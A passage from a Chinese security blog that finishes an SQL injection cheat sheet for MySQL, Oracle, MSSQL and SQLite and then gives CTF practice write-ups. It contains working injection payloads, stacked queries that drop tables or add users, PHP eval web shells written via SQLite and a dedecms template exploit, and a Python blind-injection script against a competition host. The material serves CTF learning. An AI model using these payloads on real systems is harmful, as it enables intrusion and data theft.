<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> (<span class="title">select</span> 1,2,<span class="title">c</span> <span class="title">from</span> (<span class="title">select</span> 1,2 <span class="title">as</span> <span class="title">c</span> <span class="title">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">flag</span>) <span class="title">as</span> <span class="title">b</span>) <span class="title">limit</span> 1,1</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/16/SQL注入总结/5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h6 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h6><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> c <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="symbol">`a`</span>)m <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">0</span> <span class="symbol">`i`</span>)o <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span> <span class="symbol">`b`</span>)n <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span> <span class="symbol">`c`</span>)t <span class="keyword">where</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> flag)x;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h5 id="（8）可报错时爆表名、字段名、库名"><a href="#（8）可报错时爆表名、字段名、库名" class="headerlink" title="（8）可报错时爆表名、字段名、库名"></a>（8）可报错时爆表名、字段名、库名</h5><h6 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h6><p>上文介绍可以使用无列明注入，但是如果再进行限制,不允许使用union 该怎么破呢？<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">as</span> a <span class="keyword">join</span> <span class="keyword">admin</span> <span class="keyword">as</span> b) <span class="keyword">as</span> c)</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/16/SQL注入总结/6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把当前表第一个字段成功爆出来了。</p>
<p>这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</p>
<p>同时，可以利用using爆其他字段：<br><img src="/2019/07/16/SQL注入总结/7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h6 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h6><p>翻阅mysql的文档发现了一个非常好玩的函数</p>
<p>Polygon(ls1, ls2, …)</p>
<p>Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是NULL</p>
<p>如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。<br><img src="/2019/07/16/SQL注入总结/8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h6 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h6><p>上面的方法已经可以爆出库名了，提供另一个方法<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span>-a()</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h5 id="（9）堆叠注入"><a href="#（9）堆叠注入" class="headerlink" title="（9）堆叠注入"></a>（9）堆叠注入</h5><h6 id="新建一个表"><a href="#新建一个表" class="headerlink" title="新建一个表"></a>新建一个表</h6><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=1;create table test like users;</span><br></pre></td></tr></table></figure>
<h6 id="删除上面新建的test表"><a href="#删除上面新建的test表" class="headerlink" title="删除上面新建的test表"></a>删除上面新建的test表</h6><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=1;drop table test;</span><br></pre></td></tr></table></figure>
<h6 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h6><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=1;select 1,2,3;</span><br></pre></td></tr></table></figure>
<h6 id="加载文件"><a href="#加载文件" class="headerlink" title="加载文件"></a>加载文件</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'c:/tmpupbbn.php'</span>);</span><br></pre></td></tr></table></figure>
<h6 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">'100'</span>,<span class="string">'new'</span>,<span class="string">'new'</span>);</span><br></pre></td></tr></table></figure>
<h6 id="找一处可查询处-利用修改表名来拿数据"><a href="#找一处可查询处-利用修改表名来拿数据" class="headerlink" title="找一处可查询处,利用修改表名来拿数据"></a>找一处可查询处,利用修改表名来拿数据</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">';<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">to</span> <span class="string">`xxxx`</span>;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span>;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">add</span> <span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment;%23</span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="三、其他数据库"><a href="#三、其他数据库" class="headerlink" title="三、其他数据库"></a>三、其他数据库</h2><h3 id="1-Oracle"><a href="#1-Oracle" class="headerlink" title="1.Oracle"></a>1.Oracle</h3><h6 id="注释符："><a href="#注释符：" class="headerlink" title="注释符："></a>注释符：</h6><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
<h6 id="当前用户权限："><a href="#当前用户权限：" class="headerlink" title="当前用户权限："></a>当前用户权限：</h6><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> session_roles</span><br></pre></td></tr></table></figure>
<h6 id="当前数据库版本："><a href="#当前数据库版本：" class="headerlink" title="当前数据库版本："></a>当前数据库版本：</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$<span class="keyword">version</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h6 id="服务器监听IP："><a href="#服务器监听IP：" class="headerlink" title="服务器监听IP："></a>服务器监听IP：</h6><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> utl_inaddr.get_host_address <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
<h6 id="服务器操作系统："><a href="#服务器操作系统：" class="headerlink" title="服务器操作系统："></a>服务器操作系统：</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">member</span> <span class="keyword">from</span> v$<span class="keyword">logfile</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h6 id="服务器sid："><a href="#服务器sid：" class="headerlink" title="服务器sid："></a>服务器sid：</h6><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> instance_name fromv$instance</span><br></pre></td></tr></table></figure>
<h6 id="当前连接用户："><a href="#当前连接用户：" class="headerlink" title="当前连接用户："></a>当前连接用户：</h6><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">SYS_CONTEXT</span> (<span class="params"><span class="string">'USERENV'</span>, <span class="string">'CURRENT_USER'</span></span>)<span class="keyword">from</span> dual</span></span><br></pre></td></tr></table></figure>
<h6 id="获取数据库名："><a href="#获取数据库名：" class="headerlink" title="获取数据库名："></a>获取数据库名：</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span></span><br><span class="line">依次爆出所有数据库名，假设第一个库名为first_dbname哪个第二个库<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span> <span class="keyword">and</span> owner&lt;&gt;<span class="string">'first_dbname'</span>依次类推</span><br></pre></td></tr></table></figure>
<h6 id="获取表名："><a href="#获取表名：" class="headerlink" title="获取表名："></a>获取表名：</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>，依次爆出所有表类似暴库。</span><br></pre></td></tr></table></figure>
<h6 id="获取字段名："><a href="#获取字段名：" class="headerlink" title="获取字段名："></a>获取字段名：</h6><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select column_name <span class="keyword">from</span> user_tab_columns where <span class="attribute">table_name</span>=<span class="string">'tablename'</span> <span class="keyword">and</span> <span class="attribute">rownum</span>=1，</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="2-MSSQL"><a href="#2-MSSQL" class="headerlink" title="2.MSSQL"></a>2.MSSQL</h3><h6 id="数据库版本："><a href="#数据库版本：" class="headerlink" title="数据库版本："></a>数据库版本：</h6><p><code>select @@VERSION</code></p>
<h6 id="数据库名："><a href="#数据库名：" class="headerlink" title="数据库名："></a>数据库名：</h6><p><code>select db_name()</code></p>
<h6 id="数据库ip地址："><a href="#数据库ip地址：" class="headerlink" title="数据库ip地址："></a>数据库ip地址：</h6><p><code>select local_net_address from sys.dm_exec_connextions where Session_id=@@spid</code></p>
<h6 id="暴当前表中的列："><a href="#暴当前表中的列：" class="headerlink" title="暴当前表中的列："></a>暴当前表中的列：</h6><p><code>article.asp?id=6 group by admin.username having 1=1--</code></p>
<p><code>article.asp?id=6 group by admin.username,admin.password having 1=1--</code></p>
<h6 id="暴任意表和列："><a href="#暴任意表和列：" class="headerlink" title="暴任意表和列："></a>暴任意表和列：</h6><p><code>and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)&gt;1</code></p>
<p><code>and (select top col_name(object_id(&#39;admin&#39;),N) from sysobjects)&gt;1</code></p>
<h6 id="暴数据库数据："><a href="#暴数据库数据：" class="headerlink" title="暴数据库数据："></a>暴数据库数据：</h6><p><code>and (select top 1 password from admin where id=N)&gt;1</code></p>
<p><br></p>
<h3 id="3-SQLite"><a href="#3-SQLite" class="headerlink" title="3.SQLite"></a>3.SQLite</h3><h5 id="（1）常用信息及语句"><a href="#（1）常用信息及语句" class="headerlink" title="（1）常用信息及语句"></a>（1）常用信息及语句</h5><p>数据库版本：<br><code>select sqlite_version()</code></p>
<p>获取所有表名：<br><code>SELECT name FROM sqlite_master WHERE type=&#39;table&#39;</code></p>
<p>所有表结构(包含字段名，表名)：<br><code>SELECT sql FROM sqlite_master WHERE type=&#39;table&#39;</code></p>
<p>注释符<br><code>--</code></p>
<p>盲注常用函数：<code>substr()（没有mid、left等函数），判断长度函数length()</code></p>
<h5 id="（2）BOOL盲注"><a href="#（2）BOOL盲注" class="headerlink" title="（2）BOOL盲注"></a>（2）BOOL盲注</h5><p>bool条件构造和MySQL一样，但是亦或运算的Payload不可用，注释符使用–。</p>
<p>逻辑判断目前我就翻到一个substr()，应用实例：<br><code>cond=&#39;FALSE&#39; or (substr(&#39;abc&#39;,1,1)=&#39;a&#39;)</code></p>
<h5 id="（3）延时盲注"><a href="#（3）延时盲注" class="headerlink" title="（3）延时盲注"></a>（3）延时盲注</h5><p>sqlite没有类似sleep()的函数，但有个函数randomblob(N)，生成N个任意字符，可以造成延时。</p>
<p>SQLite没有if，可以使用case when … then …</p>
<p>格式<code>cond=&#39;true&#39; AND 1=(case when (bool) then randomblob(100000000) else 0 end)</code><br>100000000个字符就有明显延时了。</p>
<p>注意cond为真，并且不要有太多条数据，因为有一条数据就会执行一次<code>randomblob(100000000)</code>，如果数据很多的话，服务器直接挂了。可以首先判断一下数据量，再确定N的值，比如我这里有100多条数据，就可以<code>id=&#39;&#39; or 1 AND 1=randomblob(1000000)</code>这样，把N的值缩小100倍。灵活运用。</p>
<p>运用实例：<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">' <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">case</span> <span class="keyword">when</span> substr(<span class="symbol">'abc</span>',<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'a'</span> <span class="keyword">then</span> randomblob(<span class="number">1000000</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<h5 id="（4）写文件"><a href="#（4）写文件" class="headerlink" title="（4）写文件"></a>（4）写文件</h5><p>需要直接访问数据库，或堆叠查询选项启用（默认关闭）<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">';ATTACH DATABASE '/tmp/p0.php' AS p0;<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> p0.shell (<span class="keyword">data</span> <span class="built_in">text</span>);<span class="keyword">INSERT</span> <span class="keyword">INTO</span> p0.shell (<span class="keyword">data</span>) <span class="keyword">VALUES</span> (<span class="string">'&lt;?php eval($_POST[1]);?&gt;'</span>);<span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p>root权限的话可以写计划任务和公钥，参考redis未授权访问利用。</p>
<h5 id="（5）读文件"><a href="#（5）读文件" class="headerlink" title="（5）读文件"></a>（5）读文件</h5><p>只能用在Windows上，需要特殊配置。<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">load_extension</span><span class="params">(library_file,entry_point)</span></span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全测试个人赛练习</title>
    <url>/2019/10/25/Web%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B8%AA%E4%BA%BA%E8%B5%9B%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<p>报了一个Web安全测试个人赛，提供了赛前的练习，做一下就当准备了吧…</p>
<h1 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h1><p>查看源代码：<br><img src="/2019/10/25/Web安全测试个人赛练习/20191021165329408.png" alt="在这里插入图片描述"></p>
<p>数组绕过即可，post：<code>data1[]=a&amp;data2[]=b</code></p>
<p><br></p>
<h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p><img src="/2019/10/25/Web安全测试个人赛练习/20191021171328452.png" alt="在这里插入图片描述"><br>同样是一道md5绕过，不过这里没法绕过，只能老老实实去找md5碰撞，google还是挺好找的</p>
<p>post:<br><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">data<span class="number">1</span>=M<span class="symbol">%C9h</span><span class="symbol">%FF</span><span class="symbol">%0</span>E<span class="symbol">%E3</span><span class="symbol">%5</span>C<span class="symbol">%20</span><span class="symbol">%95</span>r<span class="symbol">%D4w</span><span class="symbol">%7</span>Br<span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%D3o</span><span class="symbol">%A7</span><span class="symbol">%B2</span><span class="symbol">%1</span>B<span class="symbol">%DCV</span><span class="symbol">%B7J</span><span class="symbol">%3</span>D<span class="symbol">%C0x</span><span class="symbol">%3</span>E<span class="symbol">%7</span>B<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%AF</span><span class="symbol">%BF</span><span class="symbol">%A2</span><span class="symbol">%00</span><span class="symbol">%A8</span><span class="symbol">%28</span>K<span class="symbol">%F3n</span><span class="symbol">%8</span>EKU<span class="symbol">%B3_Bu</span><span class="symbol">%93</span><span class="symbol">%D8Igm</span><span class="symbol">%A0</span><span class="symbol">%D1U</span><span class="symbol">%5</span>D<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%FB_</span><span class="symbol">%07</span><span class="symbol">%FE</span><span class="symbol">%A2</span>&amp;data<span class="number">2</span>=M<span class="symbol">%C9h</span><span class="symbol">%FF</span><span class="symbol">%0</span>E<span class="symbol">%E3</span><span class="symbol">%5</span>C<span class="symbol">%20</span><span class="symbol">%95</span>r<span class="symbol">%D4w</span><span class="symbol">%7</span>Br<span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%D3o</span><span class="symbol">%A7</span><span class="symbol">%B2</span><span class="symbol">%1</span>B<span class="symbol">%DCV</span><span class="symbol">%B7J</span><span class="symbol">%3</span>D<span class="symbol">%C0x</span><span class="symbol">%3</span>E<span class="symbol">%7</span>B<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%AF</span><span class="symbol">%BF</span><span class="symbol">%A2</span><span class="symbol">%02</span><span class="symbol">%A8</span><span class="symbol">%28</span>K<span class="symbol">%F3n</span><span class="symbol">%8</span>EKU<span class="symbol">%B3_Bu</span><span class="symbol">%93</span><span class="symbol">%D8Igm</span><span class="symbol">%A0</span><span class="symbol">%D1</span><span class="symbol">%D5</span><span class="symbol">%5</span>D<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%FB_</span><span class="symbol">%07</span><span class="symbol">%FE</span><span class="symbol">%A2</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191021174409280.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h1><p>代码审计题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第一层：<br>既要通过<code>A_A</code>传参，又限制了查询字符串不能为<code>A_A</code>，这里用到了php的一个小特性..</p>
<p>可以参考这篇文章：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p>
<p>借用文章里的一张图：<br><img src="/2019/10/25/Web安全测试个人赛练习/20191021180048973.png" alt="在这里插入图片描述"></p>
<p>本题中的绕过方式有下面几种：<br><img src="/2019/10/25/Web安全测试个人赛练习/20191021180213936.png" alt="在这里插入图片描述"></p>
<p>第二层：<br>传入的参数要大于9999999999，用数组绕过；string后要大于零，任意字符串即可。<br><img src="/2019/10/25/Web安全测试个人赛练习/20191022204717628.png" alt="在这里插入图片描述"></p>
<p>综上，最后payload：<code>?A.A[]=a</code>，注释中看到flag</p>
<p><br></p>
<h1 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h1><h5 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h5><p>看到参数<code>url=upload</code>，尝试php伪协议文件包含，发现直接可以base64读出flag。</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191022213437597.png" alt="在这里插入图片描述"><br>payload：<code>..index.php/url=php://filter/convert.base64-encode/resource=index</code></p>
<h5 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h5><p>毕竟给了上传页面，测试了一下，为白名单过滤，无法绕过…看到可以上传zip文件，可以利用<code>phar://</code>协议文件包含。</p>
<p>将一句话木马<code>shell.php</code>打包成压缩包，然后上传得到路径：<br><img src="/2019/10/25/Web安全测试个人赛练习/20191022213725153.png" alt="在这里插入图片描述"><br>然后连接小马即可，连接url：<code>http://114.55.36.69:8009/index.php?url=phar://upload/695d93c8c583b14b83475449ed1f7b35.zip/shell</code></p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/2019102221384012.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="新闻搜索"><a href="#新闻搜索" class="headerlink" title="新闻搜索"></a>新闻搜索</h1><p>一个搜索页面，直接sqlmap就能跑出来</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191022231802681.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h1><p>和上一题差不多，<code>word</code>参数存在搜索型注入，不过加了过滤，可以用内联绕过。</p>
<p>查表：<code>%&#39; /*!union*/ /*!select*/ 1,2,(/*!select*/ group_concat(table_name) from information_schema.tables where table_schema=database())#</code><br><img src="/2019/10/25/Web安全测试个人赛练习/20191023213252683.png" alt="在这里插入图片描述"></p>
<p>查列：<code>%&#39; /*!union*/ /*!select*/ 1,2,(/*!select*/ group_concat(column_name) from information_schema.columns where table_name=&#39;admin&#39;)#</code></p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191023213257666.png" alt="在这里插入图片描述"></p>
<p>查数据：<code>%&#39; /*!union*/ /*!select*/ 1,2,(/*!select*/ group_concat(flag) from admin)#</code><br><img src="/2019/10/25/Web安全测试个人赛练习/20191023213321255.png" alt="在这里插入图片描述"></p>
<h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>打开是一个贪吃蛇游戏，查看<code>game.js</code>，有一段奇奇怪怪的颜表情，复制到控制台输出一下：</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191022235914697.png" alt="在这里插入图片描述"><br>输出了一个假的flag，看一下右下角的debugger，得到flag：</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191022235945752.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h1><p>是一个dedecms sp2 v5.7，搜一下对应的漏洞即可，我参考的是这个：<a href="https://www.freebuf.com/vuls/164035.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/164035.html</a></p>
<p>先访问：<code>/dede/tpl.php?action=upload</code>，在源码中获得token，在下一步要用到。</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191023001429610.png" alt="在这里插入图片描述"><br>再访问：<code>/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[cmd]);?%3E&amp;token=c5288eb4a985baa3520c2d006f45e346</code>，就会生成我们的shell文件。</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191023001514426.png" alt="在这里插入图片描述"><br>最后连接我们的shell，访问：<code>/include/taglib/moonsec.lib.php</code>，先<code>find / -name flag</code>找一下flag得位置：</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191023001625482.png" alt="在这里插入图片描述">读一下flag：</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191023001641674.png" alt="在这里插入图片描述"></p>
<h1 id="新瓶装旧酒"><a href="#新瓶装旧酒" class="headerlink" title="新瓶装旧酒"></a>新瓶装旧酒</h1><p>这一题上来就给了源码，审计了半天…没看出来什么问题</p>
<p>后来知道是apache的版本问题，存在解析漏洞，即从右向左解析，遇到无法解析的就跳过继续像左解析。</p>
<p>所以我们将小马的后缀改为.<code>.PHP.jpg</code>，之所以把<code>PHP</code>大写来绕过代码中对<code>.ph</code>的过滤，然后将其压缩成<code>zip</code>压缩包上传</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/2019102323573666.png" alt="在这里插入图片描述"><br>得到路径连接即可，在<code>flag.php</code>中发现flag。</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191023235852776.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="sleepcms"><a href="#sleepcms" class="headerlink" title="sleepcms"></a>sleepcms</h1><p>访问<code>robots.txt</code>可以看到如下sql语句，应该是要注入出来：<br><img src="/2019/10/25/Web安全测试个人赛练习/20191024194136975.png" alt="在这里插入图片描述"><br>根据题目名字，想到应该是时间盲注，但是过滤了常用的<code>sleep()</code>和<code>benchmark()</code>，经测试，还可以用<code>get_lock()</code>函数来进行延时。</p>
<p>但是发现<code>select</code>也被过滤了，尝试各种方式均无法绕过… 然后发现<code>article</code>页面回显的数据就是在<code>flag</code>那个表里查出来的，所以其实后台已经帮我们写好<code>select</code>语句了，直接拼接上<code>content</code>字段即可，用不到<code>select</code>。</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://114.55.36.69:8007/article.php"</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">		payload = <span class="string">f"?id=1' and if(ascii(substr((content),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,get_lock('lethe',3),1)%23"</span></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			s.get(url + payload, timeout=<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">except</span> Exception:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h1 id="秘密的系统"><a href="#秘密的系统" class="headerlink" title="秘密的系统"></a>秘密的系统</h1><p>访问<code>/web/robots.txt</code>得到提示<code>index.php?r=site/loginuser_1</code>，是一个登录界面，但是没有账号密码没有注册页面，查看源代码发现：</p>
<p><img src="/2019/10/25/Web安全测试个人赛练习/20191024201210752.png" alt="在这里插入图片描述"></p>
<p>于是访问该github账号，得到如下提示：<br><img src="/2019/10/25/Web安全测试个人赛练习/20191024201239823.png" alt="在这里插入图片描述"><br>给了我们一个账号密码<code>test/cil_sec</code>和cookie生成的规则，于是我们登录该账号，得到cookie如下：<br><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cib</span>=a<span class="number">%3</span>A3<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A2<span class="number">%3</span>A<span class="number">%22</span>id<span class="number">%22</span><span class="number">%3</span>Bi<span class="number">%3</span>A2<span class="number">%3</span>Bs<span class="number">%3</span>A4<span class="number">%3</span>A<span class="number">%22</span>name<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A4<span class="number">%3</span>A<span class="number">%22</span>test<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A4<span class="number">%3</span>A<span class="number">%22</span>sign<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A32<span class="number">%3</span>A<span 